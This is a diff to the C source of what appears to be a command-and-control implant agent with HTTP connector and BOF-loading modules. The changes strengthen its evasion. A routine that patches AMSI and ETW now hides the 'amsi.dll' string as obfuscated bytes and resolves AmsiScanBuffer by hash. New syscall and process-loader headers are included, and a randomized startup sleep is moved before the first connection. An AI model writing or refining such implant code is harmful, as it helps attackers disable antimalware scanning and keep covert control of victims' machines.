@@ -1,12 +1,13 @@
 #include "main.h"
 #include "ApiLoader.h"
+#include "ProcLoader.h"
+#include "Syscalls.h"
 #include "Commander.h"
 #include "utils.h"
 #include "Crypt.h"
 #include "WaitMask.h"
 #include "Boffer.h"
 #include "Connector.h"
-#include "Syscalls.h"
 
 #if defined(BEACON_HTTP)
 #include "ConnectorHTTP.h"
@@ -52,16 +53,9 @@ static void PatchEtwAmsi()
 	}
 
 	CHAR amsi_c[13];
-	amsi_c[0]  = HdChrA('a');
-	amsi_c[1]  = HdChrA('m');
-	amsi_c[2]  = HdChrA('s');
-	amsi_c[3]  = HdChrA('i');
-	amsi_c[4]  = HdChrA('.');
-	amsi_c[5]  = HdChrA('d');
-	amsi_c[6]  = HdChrA('l');
-	amsi_c[7]  = HdChrA('l');
-	amsi_c[8]  = 0;
-
+	amsi_c[0] = 0x1C; amsi_c[1] = 0x38; amsi_c[2] = 0x26; amsi_c[3] = 0x3C;
+	amsi_c[4] = 0x7B; amsi_c[5] = 0x31; amsi_c[6] = 0x39; amsi_c[7] = 0x39;
+	amsi_c[8] = 0;
 	HMODULE hAmsi = ApiWin->LoadLibraryA(amsi_c);
 	if (hAmsi) {
 		PVOID pAmsiScanBuffer = GetSymbolAddress(hAmsi, 0x6aede52b);
@@ -86,6 +80,8 @@ static void PatchEtwAmsi()
 	}
 }
 
+extern void mySleep(ULONG ms);
+
 DWORD WINAPI AgentMain(LPVOID lpParam)
 {
 	if (!ApiLoad())
@@ -95,6 +91,11 @@ DWORD WINAPI AgentMain(LPVOID lpParam)
 	PatchEtwAmsi();
 
 	g_Agent = new Agent();
+
+	ULONG initDelay = GenerateRandom32() % (g_Agent->config->sleep_delay * 1000);
+	if (initDelay > 0)
+		mySleep(initDelay);
+
 	g_Connector = CreateConnector();
 
 	g_AsyncBofManager = new Boffer();
@@ -110,10 +111,6 @@ DWORD WINAPI AgentMain(LPVOID lpParam)
 
 	Packer* packerOut = new Packer();
 	packerOut->Pack32(0);
-
-	ULONG initDelay = GenerateRandom32() % (g_Agent->config->sleep_delay * 1000);
-	if (initDelay > 0)
-		mySleep(initDelay);
 
 	do {
 		if (!g_Connector->WaitForConnection())
